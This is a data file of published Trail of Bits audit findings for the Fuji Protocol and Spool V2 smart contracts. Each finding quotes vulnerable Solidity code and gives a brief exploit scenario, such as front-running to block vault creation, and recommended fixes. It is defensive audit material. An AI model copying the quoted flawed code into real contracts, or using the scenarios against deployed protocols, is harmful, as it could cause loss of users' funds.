        "body": "The Harvester contracts getHarvestTransaction function incorrectly returns claimedToken and transaction values of 0 if the _farmProtocolNum parameter is set to a value greater than 1 or if the harvestType value is set to value greater than 2. However, the function does not revert on invalid _farmProtocolNum and harvestType values. function getHarvestTransaction(uint256 _farmProtocolNum, bytes memory _data) external view override returns (address claimedToken, Transaction memory transaction) { if (_farmProtocolNum == 0) { transaction.to = 0x3d9819210A31b4961b30EF54bE2aeD79B9c9Cd3B; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimComp(address)\")), msg.sender ); claimedToken = 0xc00e94Cb662C3520282E6f5717214004A7f26888; } else if (_farmProtocolNum == 1) { uint256 harvestType = abi.decode(_data, (uint256)); if (harvestType == 0) { // claim (, address[] memory assets) = abi.decode(_data, (uint256, address[])); transaction.to = 0xd784927Ff2f95ba542BfC824c8a8a98F3495f6b5; transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"claimRewards(address[],uint256,address)\")), assets, type(uint256).max, msg.sender ); } else if (harvestType == 1) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; transaction.data = abi.encodeWithSelector(bytes4(keccak256(\"cooldown()\"))); } else if (harvestType == 2) { // transaction.to = 0x4da27a545c0c5B758a6BA100e3a049001de870f5; 39 Fuji Protocol transaction.data = abi.encodeWithSelector( bytes4(keccak256(\"redeem(address,uint256)\")), msg.sender, type(uint256).max ); claimedToken = 0x7Fc66500c84A76Ad7e9c93437bFc5Ac33E2DDaE9; } } } Figure 18.1: Harvester.sol#L13-54 Exploit Scenario Alice, an executor of the Fuji Protocol, calls getHarvestTransaction with the _farmProtocolNum parameter set to 2. As a result, rather than reverting, the function returns claimedToken and transaction values of 0. Recommendations Short term, revise getHarvestTransaction so that it reverts if it is called with invalid farmProtocolNum or harvestType values. Long term, ensure that all functions revert if they are called with invalid values. 40 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Lack of data validation in Controllers doRenancing function ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The Controller contracts doRefinancing function does not check the _newProvider value. Therefore, the function accepts invalid values for the _newProvider parameter. function doRefinancing( address _vaultAddr, address _newProvider, uint256 _ratioA, uint256 _ratioB, uint8 _flashNum ) external isValidVault(_vaultAddr) onlyOwnerOrExecutor { IVault vault = IVault(_vaultAddr); [...] [...] IVault(_vaultAddr).setActiveProvider(_newProvider); } Figure 19.1: Controller.sol#L44-84 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller.doRefinancing with the _newProvider parameter set to the same address as the active provider. As a result, unnecessary ash loan fees will be paid. Recommendations Short term, revise the doRefinancing function so that it reverts if _newProvider is set to the same address as the active provider. Long term, ensure that all functions revert if they are called with invalid values. 41 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "20. Lack of data validation on function parameters ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Certain setter functions fail to validate the addresses they receive as input. The following addresses are not validated:  The addresses passed to all setters in the FujiAdmin contract  The _newFujiAdmin address in the setFujiAdmin function in the Controller and FujiVault contracts  The _provider address in the FujiVault.setActiveProvider function  The _oracle address in the FujiVault.setOracle function  The _providers addresses in the FujiVault.setProviders function  The newOwner address in the transferOwnership function in the Claimable and ClaimableUpgradeable contracts Exploit scenario Alice, a member of the Fuji Protocol team, invokes the FujiVault.setOracle function and sets the oracle address as address(0). As a result, code relying on the oracle address is no longer functional. Recommendations Short term, add zero-value or contract existence checks to the functions listed above to ensure that users cannot accidentally set incorrect values, misconguring the protocol. Long term, use Slither, which will catch missing zero checks. 42 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "12. Missing events for critical operations ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Many functions that make important state changes do not emit events. These functions include, but are not limited to, the following:  All setters in the FujiAdmin contract  The setFujiAdmin, setFujiERC1155, setFactor, setOracle, and setProviders functions in the FujiVault contract  The setMapping and setURI functions in the FujiMapping contract  The setFujiAdmin and setExecutors functions in the Controller contract  The setURI and setPermit functions in the FujiERC1155 contract  The setPriceFeed function in the FujiOracle contract Exploit scenario An attacker gains permission to execute an operation that changes critical protocol parameters. She executes the operation, which does not emit an event. Neither the Fuji Protocol team nor the users are notied about the parameter change. The attacker uses the changed parameter to steal funds. Later, the attack is detected due to the missing funds, but it is too late to react and mitigate the attack. Recommendations Short term, ensure that all state-changing operations emit events. Long term, use an event monitoring system like Tenderly or Defender, use Defenders automated incident response feature, and develop an incident response plan to follow in case of an emergency. 32 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Low"
        ]
    },
    {
        "title": "13. Indexes are not updated before all operations that require up-to-date indexes ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The FujiERC1155 contract uses indexes to keep track of interest rates. Refer to Appendix F for more detail on the index calculation. The FujiVault contracts updateF1155Balances function is responsible for updating indexes. However, this function is not called before all operations that read indexes. As a result, these operations use outdated indexes, which results in incorrect accounting and could make the protocol vulnerable to exploits. FujiVault.deposit calls FujiERC1155._mint, which reads indexes but does not call updateF1155Balances. FujiVault.paybackLiq calls FujiERC1155.balanceOf, which reads indexes but does not call updateF1155Balances. Exploit Scenario The indexes have not been updated in one day. User Bob deposits collateral into the FujiVault. Day-old indexes are used to compute Bobs scaled amount, causing Bob to gain interest for an additional day for free. Recommendations Short term, ensure that all operations that require up-to-date indexes rst call updateF1155Balances. Write tests for each function that depends on up-to-date indexes with assertions that fail if indexes are outdated. Long term, redesign the way indexes are accessed and updated such that a developer cannot simply forget to call updateF1155Balances. 33 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. Formula for index calculation is unnecessarily complex ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Indexes are updated within the FujiERC1155 contracts updateState function, shown in gure 15.1. Refer to Appendix F for more detail on the index calculation. function updateState(uint256 _assetID, uint256 newBalance) external override onlyPermit { uint256 total = totalSupply(_assetID); if (newBalance > 0 && total > 0 && newBalance > total) { uint256 diff = newBalance - total; uint256 amountToIndexRatio = (diff.wadToRay()).rayDiv(total.wadToRay()); uint256 result = amountToIndexRatio + WadRayMath.ray(); result = result.rayMul(indexes[_assetID]); require(result <= type(uint128).max, Errors.VL_INDEX_OVERFLOW); indexes[_assetID] = uint128(result); // TODO: calculate interest rate for a fujiOptimizer Fee. } } Figure 15.1: FujiERC1155.sol#L40-57 The code in gure 14.1 translates to the following equation: =    1 * (1 + (    )/ 1 ) 1 Using the distributive property, we can transform this equation into the following: =    1 / * (1 +   1 This version can then be simplied:   / 1 ) 1 =    1 / * (1 +   1  1) 35 Fuji Protocol Finally, we can simplify the equation even further: =    1 / *   1 The resulting equation is simpler and more intuitively conveys the underlying ideathat the index grows by the same ratio as the balance grew since the last index update. Recommendations Short term, use the simpler index calculation formula in the updateState function of the Fuji1155Contract. This will result in code that is more intuitive and that executes using slightly less gas. Long term, use simpler versions of the equations used by the protocol to make the arithmetic easier to understand and implement correctly. 36 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Undetermined"
        ]
    },
    {
        "title": "16. Flashers initiateFlashloan function does not revert on invalid ashnum values ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "The Flasher contracts initiateFlashloan function does not initiate a ash loan or perform a renancing operation if the flashnum parameter is set to a value greater than 2. However, the function does not revert on invalid flashnum values. function initiateFlashloan(FlashLoan.Info calldata info, uint8 _flashnum) external isAuthorized { if (_flashnum == 0) { _initiateAaveFlashLoan(info); } else if (_flashnum == 1) { _initiateDyDxFlashLoan(info); } else if (_flashnum == 2) { _initiateCreamFlashLoan(info); } } Figure 16.1: Flasher.sol#L61-69 Exploit Scenario Alice, an executor of the Fuji Protocol, calls Controller. doRefinancing with the flashnum parameter set to 3. As a result, no ash loan is initialized, and no renancing happens; only the active provider is changed. This results in unexpected behavior. For example, if a user wants to repay his debt after renancing, the operation will fail, as no debt is owed to the active provider. Recommendations Short term, revise initiateFlashloan so that it reverts when it is called with an invalid flashnum value. Long term, ensure that all functions revert if they are called with invalid values. 37 Fuji Protocol",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "21. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/FujiProtocol.pdf",
        "body": "Fuji Protocol has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed. Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past. A high-severity bug in the emscripten-generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6. More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe. It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-jscauses a security vulnerability in the Fuji Protocol contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity. 43 Fuji Protocol A. Vulnerability Categories The following tables describe the vulnerability categories, severity levels, and diculty levels used in this document. Vulnerability Categories Category",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: High"
        ]
    },
    {
        "title": "1. Solidity compiler optimizations can be problematic ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Spool V2 has enabled optional compiler optimizations in Solidity. There have been several optimization bugs with security implications. Moreover, optimizations are actively being developed . Solidity compiler optimizations are disabled by default, and it is unclear how many contracts in the wild actually use them. Therefore, it is unclear how well they are being tested and exercised. High-severity security issues due to optimization bugs have occurred in the past . A high-severity bug in the emscripten -generated solc-js compiler used by True and Remix persisted until late 2018. The x for this bug was not reported in the Solidity CHANGELOG. Another high-severity optimization bug resulting in incorrect bit shift results was patched in Solidity 0.5.6 . More recently, another bug due to the incorrect caching of keccak256 was reported. A compiler audit of Solidity from November 2018 concluded that the optional optimizations may not be safe . It is likely that there are latent bugs related to optimization and that new bugs will be introduced due to future optimizations. Exploit Scenario A latent or future bug in Solidity compiler optimizationsor in the Emscripten transpilation to solc-js causes a security vulnerability in the Spool V2 contracts. Recommendations Short term, measure the gas savings from optimizations and carefully weigh them against the possibility of an optimization-related bug. Long term, monitor the development and adoption of Solidity compiler optimizations to assess their maturity.",
        "labels": [
            "Trail of Bits",
            "Severity: Undetermined",
            "Difficulty: High"
        ]
    },
    {
        "title": "2. Risk of SmartVaultFactory DoS due to lack of access controls on grantSmartVaultOwnership ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Anyone can set the owner of the next smart vault to be created, which will result in a DoS of the SmartVaultFactory contract. The grantSmartVaultOwnership function in the SpoolAccessControl contract allows anyone to set the owner of a smart vault. This function reverts if an owner is already set for the provided smart vault. function grantSmartVaultOwnership( address smartVault, address owner) external { if (smartVaultOwner[smartVault] != address (0)) { revert SmartVaultOwnerAlreadySet(smartVault); } smartVaultOwner[smartVault] = owner; } Figure 2.1: The grantSmartVaultOwnership function in SpoolAccessControl.sol The SmartVaultFactory contract implements two functions for deploying new smart vaults: the deploySmartVault function uses the create opcode, and the deploySmartVaultDeterministically function uses the create2 opcode. Both functions create a new smart vault and call the grantSmartVaultOwnership function to make the message sender the owner of the newly created smart vault. Any user can pre-compute the address of the new smart vault for a deploySmartVault transaction by using the address and nonce of the SmartVaultFactory contract; to compute the address of the new smart vault for a deploySmartVaultDeterministically transaction, the user could front-run the transaction to capture the salt provided by the user who submitted it. Exploit Scenario Eve pre-computes the address of the new smart vault that will be created by the deploySmartVault function in the SmartVaultFactory contract. She then calls the grantSmartVaultOwnership function with the pre-computed address and a nonzero address as arguments. Now, every call to the deploySmartContract function reverts, making the SmartVaultFactory contract unusable. Using a similar strategy, Eve blocks the deploySmartVaultDeterministically function by front-running the user transaction to set the owner of the smart vault address computed using the user-provided salt. Recommendations Short term, add the onlyRole(ROLE_SMART_VAULT_INTEGRATOR, msg.sender) modier to the grantSmartVaultOwnership function to restrict access to it. Long term, follow the principle of least privilege by restricting access to the functions that grant specic privileges to actors of the system.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "3. Lack of zero-value check on constructors and initializers ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Several contracts constructors and initialization functions fail to validate incoming arguments. As a result, important state variables could be set to the zero address, which would result in the loss of assets. constructor ( ISpoolAccessControl accessControl_, IAssetGroupRegistry assetGroupRegistry_, IRiskManager riskManager_, IDepositManager depositManager_, IWithdrawalManager withdrawalManager_, IStrategyRegistry strategyRegistry_, IMasterWallet masterWallet_ , IUsdPriceFeedManager priceFeedManager_, address ghostStrategy ) SpoolAccessControllable(accessControl_) { _assetGroupRegistry = assetGroupRegistry_; _riskManager = riskManager_; _depositManager = depositManager_; _withdrawalManager = withdrawalManager_; _strategyRegistry = strategyRegistry_; _masterWallet = masterWallet_; _priceFeedManager = priceFeedManager_; _ghostStrategy = ghostStrategy; } Figure 3.1: The SmartVaultManager contracts constructor function in spool-v2-core/SmartVaultManager.sol#L111L130 These constructors include that of the SmartVaultManager contract, which sets the _masterWallet address (gure 3.1). SmartVaultManager contract is the entry point of the system and is used by users to deposit their tokens. User deposits are transferred to the _masterWallet address (gure 3.2). function _depositAssets (DepositBag calldata bag) internal returns ( uint256 ) { [...] for ( uint256 i ; i < deposits.length; ++i) { IERC20(tokens[i]).safeTransferFrom( msg.sender , address ( _masterWallet ), deposits[i]); } [...] } Figure 3.2: The _depositAssets function in spool-v2-core/SmartVaultManager.sol#L649L676 If _masterWallet is set to the zero address, the tokens will be transferred to the zero address and will be lost permanently. The constructors and initialization functions of the following contracts also fail to validate incoming arguments:  StrategyRegistry  DepositSwap  SmartVault  SmartVaultFactory  SpoolAccessControllable  DepositManager  RiskManager  SmartVaultManager  WithdrawalManager  RewardManager  RewardPool  Strategy Exploit Scenario Bob deploys the Spool system. During deployment, Bob accidentally sets the _masterWallet parameter of the SmartVaultManager contract to the zero address. Alice, excited about the new protocol, deposits 1 million WETH into it. Her deposited WETH tokens are transferred to the zero address, and Alice loses 1 million WETH. Recommendations Short term, add zero-value checks on all constructor arguments to ensure that the deployer cannot accidentally set incorrect values. Long term, use Slither , which will catch functions that do not have zero-value checks.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "4. Upgradeable contracts set state variables in the constructor ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The state variables set in the constructor of the RewardManager implementation contract are not visible in the proxy contract, making the RewardManager contract unusable. The same issue exists in the RewardPool and Strategy smart contracts. Upgradeable smart contracts using the delegatecall proxy pattern should implement an initializer function to set state variables in the proxy contract storage. The constructor function can be used to set immutable variables in the implementation contract because these variables do not consume storage slots and their values are inlined in the deployed code. The RewardManager contract is deployed as an upgradeable smart contract, but it sets the state variable _assetGroupRegistry in the constructor function. contract RewardManager is IRewardManager, RewardPool, ReentrancyGuard { ... /* ========== STATE VARIABLES ========== */ /// @notice Asset group registry IAssetGroupRegistry private _assetGroupRegistry; ... constructor ( ISpoolAccessControl spoolAccessControl, IAssetGroupRegistry assetGroupRegistry_, bool allowPoolRootUpdates ) RewardPool(spoolAccessControl, allowPoolRootUpdates) { _assetGroupRegistry = assetGroupRegistry_; } Figure 4.1: The constructor function in spool-v2-core/RewardManager.sol The value of the _assetGroupRegistry variable will not be visible in the proxy contract, and the admin will not be able to add reward tokens to smart vaults, making the RewardManager contract unusable. The following smart contracts are also aected by the same issue: 1. The ReentrancyGuard contract, which is non-upgradeable and is extended by RewardManager 2. The RewardPool contract, which sets the state variable allowUpdates in the constructor 3. The Strategy contract, which sets the state variable StrategyName in the constructor Exploit Scenario Bob creates a smart vault and wants to add a reward token to it. He calls the addToken function on the RewardManager contract, but the transaction unexpectedly reverts. Recommendations Short term, make the following changes: 1. Make _assetGroupRegistry an immutable variable in the RewardManager contract. 2. Extend the ReentrancyGuardUpgradeable contract in the RewardManager contract. 3. Make allowUpdates an immutable variable in the RewardPool contract. 4. Move the statement _strategyName = strategyName_; from the Strategy contracts constructor to the contracts __Strategy_init function. 5. Review all of the upgradeable contracts to ensure that they extend only upgradeable library contracts and that the inherited contracts have a __gap storage variable to prevent storage collision issues with future upgrades. Long term, review all of the upgradeable contracts to ensure that they use the initializer function instead of the constructor function to set state variables. Use slither-check-upgradeability to nd issues related to upgradeable smart contracts. 5. Insu\u0000cient validation of oracle price data Severity: Low Diculty: Medium Type: Data Validation Finding ID: TOB-SPL-5 Target: managers/UsdPriceFeedManager.sol",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "6. Incorrect handling of fromVaultsOnly in removeStrategy ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The removeStrategy function allows Spool admins to remove a strategy from the smart vaults using it. Admins are also able to remove the strategy from the StrategyRegistry contract, but only if the value of fromVaultsOnly is false ; however, the implementation enforces the opposite, as shown in gure 6.1. function removeStrategy( address strategy, bool fromVaultsOnly) external { _checkRole(ROLE_SPOOL_ADMIN, msg.sender ); _checkRole(ROLE_STRATEGY, strategy); ... if ( fromVaultsOnly ) { _strategyRegistry.removeStrategy(strategy); } } Figure 6.1: The removeStrategy function in spool-v2-core/SmartVaultManager.sol#L298L317 Exploit Scenario Bob, a Spool admin, calls removeStrategy with fromVaultsOnly set to true , believing that this call will not remove the strategy from the StrategyRegistry contract. However, once the transaction is executed, he discovers that the strategy was indeed removed. Recommendations Short term, replace if (fromVaultsOnly) with if (!fromVaultsOnly) in the removeStrategy function to implement the expected behavior. Long term, improve the systems unit and integration tests to catch issues such as this one.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "7. Risk of LinearAllocationProvider and ExponentialAllocationProvider reverts due to division by zero ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The LinearAllocationProvider and ExponentialAllocationProvider contracts calculateAllocation function can revert due to a division-by-zero error: LinearAllocationProvider s function reverts when the sum of the strategies APY values is 0 , and ExponentialAllocationProvider s function reverts when a single strategy has an APY value of 0 . Figure 7.1 shows a snippet of the LinearAllocationProvider contracts calculateAllocation function; if the apySum variable, which is the sum of all the strategies APY values, is 0 , a division-by-zero error will occur. uint8 [] memory arrayRiskScores = data.riskScores; for ( uint8 i; i < data.apys.length; ++i) { apySum += (data.apys[i] > 0 ? uint256 (data.apys[i]) : 0); riskSum += arrayRiskScores[i]; } uint8 riskt = uint8 (data.riskTolerance + 10); // from 0 to 20 for ( uint8 i; i < data.apys.length; ++i) { uint256 apy = data.apys[i] > 0 ? uint256 (data.apys[i]) : 0; apy = (apy * FULL_PERCENT) / apySum ; Figure 7.1: Part of the calculateAllocation function in spool-v2-core/LinearAllocationProvider.sol#L39L49 Figure 7.2 shows that for the ExponentialAllocationProvider contracts calculateAllocation function, if the call to log_2 occurs with partApy set to 0 , the function will revert because of log_2 s require statement shown in gure 7.3. for ( uint8 i; i < data.apys.length; ++i) { uint256 uintApy = (data.apys[i] > 0 ? uint256 (data.apys[i]) : 0); int256 partRiskTolerance = fromUint( uint256 (riskArray[ uint8 (20 - riskt)])); partRiskTolerance = div(partRiskTolerance, _100); int256 partApy = fromUint(uintApy); partApy = div(partApy, _100); int256 apy = exp_2(mul(partRiskTolerance, log_2(partApy) )); Figure 7.2: Part of the calculateAllocation function in spool-v2-core/ExponentialAllocationProvider.sol#L323L331 function log_2( int256 x) internal pure returns ( int256 ) { unchecked { require (x > 0); Figure 7.3: Part of the log_2 function in spool-v2-core/ExponentialAllocationProvider.sol#L32L34 Exploit Scenario Bob deploys a smart vault with two strategies using the ExponentialAllocationProvider contract. At some point, one of the strategies has 0 APY, causing the transaction call to reallocate the assets to unexpectedly revert. Recommendations Short term, modify both versions of the calculateAllocation function so that they correctly handle cases in which a strategys APY is 0 . Long term, improve the systems unit and integration tests to ensure that the basic operations work as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: High"
        ]
    },
    {
        "title": "8. Strategy APYs are never updated ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The _updateDhwYieldAndApy function is never called. As a result, each strategys APY will constantly be set to 0 . function _updateDhwYieldAndApy( address strategy, uint256 dhwIndex, int256 yieldPercentage) internal { if (dhwIndex > 1) { unchecked { _stateAtDhw[address(strategy)][dhwIndex - 1].timestamp); int256 timeDelta = int256 (block.timestamp - if (timeDelta > 0) { timeDelta; int256 normalizedApy = yieldPercentage * SECONDS_IN_YEAR_INT / int256 weight = _getRunningAverageApyWeight(timeDelta); _apys[strategy] = (_apys[strategy] * (FULL_PERCENT_INT - weight) + normalizedApy * weight) / FULL_PERCENT_INT; } } } } Figure 8.1: The _updateDhwYieldAndApy function in spool-v2-core/StrategyManager.sol#L298L317 A strategys APY is one of the parameters used by an allocator provider to decide where to allocate the assets of a smart vault. If a strategys APY is 0 , the LinearAllocationProvider and ExponentialAllocationProvider contracts will both revert when calculateAllocation is called due to a division-by-zero error. // set allocation if (uint16a16.unwrap(allocations) == 0) { _riskManager.setRiskProvider(smartVaultAddress, specification.riskProvider); _riskManager.setRiskTolerance(smartVaultAddress, specification.riskTolerance); _riskManager.setAllocationProvider(smartVaultAddress, specification.allocationProvider); allocations = _riskManager.calculateAllocation(smartVaultAddress, specification.strategies); } Figure 8.2: Part of the _integrateSmartVault function, which is called when a vault is created, in spool-v2-core/SmartVaultFactory.sol#L313L3 20 When a vault is created, the code in gure 8.2 is executed. For vaults whose strategyAllocation variable is set to 0 , which means the value will be calculated by the smart contract, and whose allocationProvide r variable is set to the LinearAllocationProvider or ExponentialAllocationProvider contract, the creation transaction will revert due to a division-by-zero error. Transactions for creating vaults with a nonzero strategyAllocation and with the same allocationProvider values mentioned above will succeed; however, the fund reallocation operation will revert because the _updateDhwYieldAndApy function is never called, causing the strategies APYs to be set to 0 , in turn causing the same division-by-zero error. Refer to nding TOB-SPL-7 , which is related to this issue; even if that nding is xed, incorrect results would still occur because of the missing _updateDhwYieldAndApy calls. Exploit Scenario Bob tries to deploy a smart vault with strategyAllocation set to 0 and allocationProvide r set to LinearAllocationProvider . The transaction unexpectedly fails. Recommendations Short term, add calls to _updateDhwYieldAndApy where appropriate. Long term, improve the systems unit and integration tests to ensure that the basic operations work as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "9. Incorrect bookkeeping of assets deposited into smart vaults ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "Assets deposited by users into smart vaults are incorrectly tracked. As a result, assets deposited into a smart vaults strategies when the flushSmartVault function is invoked correspond to the last deposit instead of the sum of all deposits into the strategies. When depositing assets into a smart vault, users can decide whether to invoke the flushSmartVault function. A smart vault ush is a synchronization process that makes deposited funds available to be deployed into the strategies and makes withdrawn funds available to be withdrawn from the strategies. However, the internal bookkeeping of deposits keeps track of only the last deposit of the current ush cycle instead of the sum of all deposits (gure 9.1). function depositAssets(DepositBag calldata bag, DepositExtras calldata bag2) external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender ) returns ( uint256 [] memory , uint256 ) { ... // transfer tokens from user to master wallet for ( uint256 i; i < bag2.tokens.length; ++i) { _vaultDeposits[bag.smartVault][bag2.flushIndex][i] = bag.assets[i]; } ... Figure 9.1: A snippet of the depositAssets function in spool-v2-core/DepositManager.sol#L379L439 The _vaultDeposits variable is then used to calculate the asset distribution in the flushSmartVault function. function flushSmartVault( address smartVault, uint256 flushIndex, address [] calldata strategies, uint16a16 allocation, address [] calldata tokens ) external returns (uint16a16) { _checkRole(ROLE_SMART_VAULT_MANAGER, msg.sender ); if (_vaultDeposits[smartVault][flushIndex][0] == 0) { return uint16a16.wrap(0); } // handle deposits uint256 [] memory exchangeRates = SpoolUtils.getExchangeRates(tokens, _priceFeedManager); _flushExchangeRates[smartVault][flushIndex].setValues(exchangeRates); uint256 [][] memory distribution = distributeDeposit ( DepositQueryBag1({ deposit: _vaultDeposits[smartVault][flushIndex].toArray(tokens.length) , exchangeRates: exchangeRates, allocation: allocation, strategyRatios: SpoolUtils.getStrategyRatiosAtLastDhw(strategies, _strategyRegistry) }) ); ... return _strategyRegistry.addDeposits(strategies, distribution) ; } Figure 9.2: A snippet of the flushSmartVault function in spool-v2-core/DepositManager.sol#L188L 226 Lastly, the _strategyRegistry.addDeposits function is called with the computed distribution, which adds the amounts to deploy in the next doHardWork function call in the _assetsDeposited variable (gure 9.3). function addDeposits( address [] calldata strategies_, uint256 [][] calldata amounts) { external onlyRole(ROLE_SMART_VAULT_MANAGER, msg.sender ) returns (uint16a16) uint16a16 indexes; for ( uint256 i; i < strategies_.length; ++i) { address strategy = strategies_[i]; uint256 latestIndex = _currentIndexes[strategy]; indexes = indexes.set(i, latestIndex); for ( uint256 j = 0; j < amounts[i].length; j++) { _assetsDeposited[strategy][latestIndex][j] += amounts[i][j]; } } return indexes; } Figure 9.3: The addDeposits function in spool-v2-core/StrategyRegistry.sol#L343L361 The next time the doHardWork function is called, it will transfer the equivalent of the last deposits amount instead of the sum of all deposits from the master wallet to the assigned strategy (gure 9.4). function doHardWork(DoHardWorkParameterBag calldata dhwParams) external whenNotPaused { ... // Transfer deposited assets to the strategy. for ( uint256 k; k < assetGroup.length; ++k) { if (_assetsDeposited[strategy][dhwIndex][k] > 0) { _masterWallet.transfer( IERC20(assetGroup[k]), strategy, _assetsDeposited[strategy][dhwIndex][k] ); } } ... Figure 9.4: A snippet of the doHardWork function in spool-v2-core/StrategyRegistry.sol#L222L3 41 Exploit Scenario Bob deploys a smart vault. One hundred deposits are made before a smart vault ush is invoked, but only the last deposits assets are deployed to the underlying strategies, severely impacting the smart vaults performance. Recommendations Short term, modify the depositAssets function so that it correctly tracks all deposits within a ush cycle, rather than just the last deposit. Long term, improve the systems unit and integration tests: test a smart vault with a single strategy and multiple strategies to ensure that smart vaults behave correctly when funds are deposited and deployed to the underlying strategies.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "10. Risk of malformed calldata of calls to guard contracts ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The GuardManager contract does not pad custom values while constructing the calldata for calls to guard contracts. The calldata could be malformed, causing the aected guard contract to give incorrect results or to always revert calls. Guards for vaults are customizable checks that are executed on every user action. The result of a guard contract either approves or disapproves user actions. The GuardManager contract handles the logic to call guard contracts and to check their results (gure 10.1). function runGuards( address smartVaultId , RequestContext calldata context) external view { [...] bytes memory encoded = _encodeFunctionCall(smartVaultId, guard , context); ( bool success , bytes memory data) = guard.contractAddress.staticcall(encoded) ; _checkResult (success, data, guard.operator, guard.expectedValue, i); } } Figure 10.1: The runGuards function in spool-v2-core/GuardManager.sol#L19L33 The arguments of the runGuards function include information related to the given user action and custom values dened at the time of guard denition. The GuardManager.setGuards function initializes the guards in the GuardManager contract. Using the guard denition, the GuardManager contract manually constructs the calldata with the selected values from the user action information and the custom values (gure 10.2). function _encodeFunctionCall ( address smartVaultId , GuardDefinition memory guard, RequestContext memory context) internal pure returns ( bytes memory ) { [...] result = bytes .concat(result, methodID ); for ( uint256 i ; i < paramsLength; ++i) { GuardParamType paramType = guard.methodParamTypes[i]; if (paramType == GuardParamType.DynamicCustomValue) { result = bytes .concat(result, abi.encode(paramsEndLoc)); paramsEndLoc += 32 + guard.methodParamValues[customValueIdx].length ; customValueIdx++; } else if (paramType == GuardParamType.CustomValue) { result = bytes .concat(result, guard.methodParamValues[customValueIdx]); customValueIdx++; } [...] } customValueIdx = 0 ; for ( uint256 i ; i < paramsLength; ++i) { GuardParamType paramType = guard.methodParamTypes[i]; if (paramType == GuardParamType.DynamicCustomValue) { result = bytes .concat(result, abi.encode(guard.methodParamValues[customValueIdx].length / 32 )); result = bytes .concat(result, guard.methodParamValues[customValueIdx]); customValueIdx++; } else if (paramType == GuardParamType.CustomValue) { customValueIdx++; } [...] } return result; } Figure 10.2: The _encodeFunctionCall function in spool-v2-core/GuardManager.sol#L111L177 However, the contract concatenates the custom values without considering their lengths and required padding. If these custom values are not properly padded at the time of guard initialization, the call will receive malformed data. As a result, either of the following could happen: 1. Every call to the guard contract will always fail, and user action transactions will always revert. The smart vault using the guard will become unusable. 2. The guard contract will receive incorrect arguments and return incorrect results. Invalid user actions could be approved, and valid user actions could be rejected. Exploit Scenario Bob deploys a smart vault and creates a 